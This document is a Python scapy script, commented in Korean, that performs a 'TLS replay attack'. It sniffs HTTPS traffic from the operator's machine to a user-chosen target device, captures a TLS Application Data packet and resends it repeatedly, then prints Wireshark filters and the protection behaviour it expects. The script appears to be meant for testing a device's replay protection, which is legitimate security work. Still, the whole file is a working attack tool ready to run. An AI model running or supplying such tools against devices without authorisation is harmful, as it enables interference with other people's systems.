#!/usr/bin/env python3
import os
import sys

if os.geteuid() != 0:
    print("[!] Run with sudo: sudo python3", sys.argv[0])
    sys.exit(1)

from scapy.all import *
import time

def get_kali_ip_for_target(target_ip):
    """
    Target IP와 같은 네트워크 대역에 있는 칼리 IP 자동 감지
    예: Target이 192.168.0.1이면 192.168.0.x를 찾음
    """
    print(f"[*] Detecting Kali IP in same network as {target_ip}...\n")
    
    # Target IP의 네트워크 대역 추출 (예: "192.168.0")
    network_prefix = '.'.join(target_ip.split('.')[:3])
    
    # 해당 대역의 IP를 가진 인터페이스 찾기
    for iface in get_if_list():
        try:
            ip = get_if_addr(iface)
            # 같은 대역이고, Target IP가 아닌 IP
            if ip and ip.startswith(network_prefix + '.') and ip != target_ip:
                print(f"[+] Found matching interface: {iface}")
                print(f"[+] Kali IP: {ip}")
                print(f"[+] Network: {network_prefix}.0/24")
                return iface, ip
        except:
            continue
    
    # 못 찾은 경우 - 사용자에게 알림
    print(f"[-] WARNING: No interface found in {network_prefix}.0/24 network")
    print(f"[-] Using default interface: {conf.iface}")
    default_ip = get_if_addr(conf.iface)
    print(f"[-] Default IP: {default_ip}")
    print(f"\n[!] This might not work if Kali is not in the same network!")
    
    return conf.iface, default_ip

# ===== 사용자 입력 =====
print("="*60)
print("TLS Replay Attack - Professional Edition")
print("="*60 + "\n")

print("Common Gateway IPs:")
print("  - 192.168.1.1   (Most common)")
print("  - 192.168.0.1   (Common)")
print("  - 192.168.2.1")
print("  - 10.0.0.1")
print("  - 172.16.0.1")
print()

# Target IP 입력 (필수)
while True:
    target_input = input("Enter Target Device IP: ").strip()
    if target_input:
        AP_IP = target_input
        break
    else:
        print("[!] Target IP is required. Please enter a valid IP.\n")

print()

# 재전송 횟수 입력
replay_count_input = input("Replay count (default: 15): ").strip()
REPLAY_COUNT = int(replay_count_input) if replay_count_input else 15

# 재전송 간격 입력
interval_input = input("Interval in seconds (default: 0.1): ").strip()
REPLAY_INTERVAL = float(interval_input) if interval_input else 0.1

print("\n" + "="*60)
print("Attack Configuration:")
print("="*60)
print(f"Target Device:  {AP_IP}")
print(f"Replay count:   {REPLAY_COUNT}x")
print(f"Interval:       {REPLAY_INTERVAL} sec")
print(f"Duration:       ~{REPLAY_COUNT * REPLAY_INTERVAL:.1f} sec")
print("="*60 + "\n")

# 칼리 IP 자동 감지 (Target IP 기반)
INTERFACE, CLIENT_IP = get_kali_ip_for_target(AP_IP)

print("\n" + "="*60)
print("Network Configuration:")
print("="*60)
print(f"Interface:      {INTERFACE}")
print(f"Kali IP:        {CLIENT_IP}")
print(f"Target IP:      {AP_IP}")
print(f"Same network:   {CLIENT_IP.rsplit('.', 1)[0] == AP_IP.rsplit('.', 1)[0]}")
print("="*60 + "\n")

# 같은 네트워크인지 확인
if CLIENT_IP.rsplit('.', 1)[0] != AP_IP.rsplit('.', 1)[0]:
    print("⚠️  WARNING: Kali and Target are in DIFFERENT networks!")
    print(f"   Kali:   {CLIENT_IP}")
    print(f"   Target: {AP_IP}")
    print("   This test may not work properly.\n")
    
    confirm = input("Continue anyway? (y/n): ").strip().lower()
    if confirm != 'y':
        print("[!] Aborted.")
        sys.exit(0)
else:
    confirm = input("Proceed with this configuration? (y/n): ").strip().lower()
    if confirm != 'y':
        print("[!] Aborted.")
        sys.exit(0)

print("\n[+] Starting attack...\n")

# ===== 글로벌 변수 =====
captured_packet = None
replay_sent = False

def packet_handler(pkt):
    global captured_packet, replay_sent
    
    if captured_packet or replay_sent:
        return
    
    if IP in pkt and TCP in pkt and Raw in pkt:
        if pkt[IP].src == CLIENT_IP and pkt[IP].dst == AP_IP:
            payload = bytes(pkt[Raw].load)
            
            # TLS Application Data (0x17)
            if len(payload) > 5 and payload[0] == 0x17:
                captured_packet = pkt
                print(f"\n{'='*60}")
                print("✓ TLS APPLICATION DATA CAPTURED!")
                print("="*60)
                print(f"Source:     {pkt[IP].src}:{pkt[TCP].sport}")
                print(f"Dest:       {pkt[IP].dst}:{pkt[TCP].dport}")
                print(f"TCP Seq:    {pkt[TCP].seq}")
                print(f"Payload:    {len(payload)} bytes")
                print(f"Time:       {time.strftime('%Y-%m-%d %H:%M:%S')}")
                print("="*60 + "\n")
                
                print(f"[*] Starting replay attack in 3 seconds...")
                time.sleep(3)
                replay_packet()

def replay_packet():
    global captured_packet, replay_sent
    
    if not captured_packet or replay_sent:
        return
    
    replay_sent = True
    
    replay_pkt = captured_packet.copy()
    del replay_pkt[IP].chksum
    del replay_pkt[TCP].chksum
    
    print("\n" + "="*60)
    print(f">>> REPLAY ATTACK INITIATED ({REPLAY_COUNT}x) <<<")
    print("="*60)
    print(f"Target:        {AP_IP}")
    print(f"Original Seq:  {captured_packet[TCP].seq}")
    print(f"Count:         {REPLAY_COUNT} transmissions")
    print(f"Interval:      {REPLAY_INTERVAL} seconds")
    print("="*60 + "\n")
    
    success_count = 0
    error_count = 0
    start_time = time.time()
    
    # 지정된 횟수만큼 재전송
    for i in range(REPLAY_COUNT):
        timestamp = time.strftime('%H:%M:%S')
        print(f"[{i+1:3d}/{REPLAY_COUNT}] {timestamp} - ", end="", flush=True)
        
        try:
            send(replay_pkt, iface=INTERFACE, verbose=0)
            print("✓")
            success_count += 1
        except Exception as e:
            print(f"✗ {e}")
            error_count += 1
        
        # 마지막이 아니면 대기
        if i < REPLAY_COUNT - 1:
            time.sleep(REPLAY_INTERVAL)
    
    elapsed_time = time.time() - start_time
    
    print("\n" + "="*60)
    print("ATTACK SUMMARY")
    print("="*60)
    print(f"Target IP:      {AP_IP}")
    print(f"Total sent:     {success_count}/{REPLAY_COUNT}")
    print(f"Failed:         {error_count}")
    print(f"Elapsed time:   {elapsed_time:.2f} seconds")
    print(f"Packets/sec:    {success_count/elapsed_time:.2f}")
    print("="*60 + "\n")
    
    print("[*] Wireshark Analysis Guide:")
    print(f"    1. Filter: tcp.flags.reset == 1 and ip.addr == {AP_IP}")
    print(f"    2. Look for: RST packets from {AP_IP} to {CLIENT_IP}")
    print(f"    3. Filter: tcp.analysis.retransmission")
    print(f"    4. Expected: {REPLAY_COUNT} packets with Seq={captured_packet[TCP].seq}")
    print()
    print("[*] Expected Protection Behavior:")
    print("    - Server sends RST packets (Replay detected)")
    print("    - Connection terminated after first replay")
    print("    - Subsequent replays ignored or RST'ed")
    print()
    
    print(f"[*] Monitoring network for 20 seconds...\n")
    time.sleep(20)
    print("\n[✓] Test complete. Press Ctrl+C to exit or wait for timeout.")

# ===== 메인 실행 =====
print("="*60)
print("PACKET CAPTURE STARTED")
print("="*60)
print(f"Interface:      {INTERFACE}")
print(f"BPF Filter:     host {AP_IP} and tcp port 443")
print(f"Monitoring:     {CLIENT_IP} → {AP_IP}")
print("="*60 + "\n")

print(">>> ACTION REQUIRED:")
print(f">>> 1. Open browser: https://{AP_IP}")
print(f">>> 2. Or use curl:  curl -k https://{AP_IP}")
print(f">>> 3. Or use wget:  wget --no-check-certificate https://{AP_IP}")
print()
print("[*] Waiting for TLS Application Data packet...\n")

try:
    sniff(
        iface=INTERFACE,
        filter=f"host {AP_IP} and tcp port 443",
        prn=packet_handler,
        store=0
    )
except KeyboardInterrupt:
    print("\n\n[!] Capture stopped by user")
    print("[*] Exiting...")
except Exception as e:
    print(f"\n[-] Error during capture: {e}")
    import traceback
    traceback.print_exc()